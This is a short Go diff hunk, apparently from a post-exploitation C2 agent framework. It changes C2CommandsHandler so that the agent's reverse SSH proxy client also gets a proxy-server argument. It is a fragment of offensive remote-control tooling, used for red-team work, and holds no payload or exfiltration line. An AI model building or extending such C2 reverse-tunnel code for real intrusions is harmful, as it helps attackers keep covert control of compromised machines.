@@ -69,7 +69,9 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		addr += ":" + RuntimeConfig.SSHProxyPort
 		ctx, cancel := context.WithCancel(context.Background())
 		if err = tun.SSHReverseProxyClient(addr, RuntimeConfig.Password,
-			&ReverseConns, ctx, cancel); err != nil {
+			&ReverseConns,
+			emp3r0r_data.ProxyServer,
+			ctx, cancel); err != nil {
 			out = err.Error()
 		}
 		return
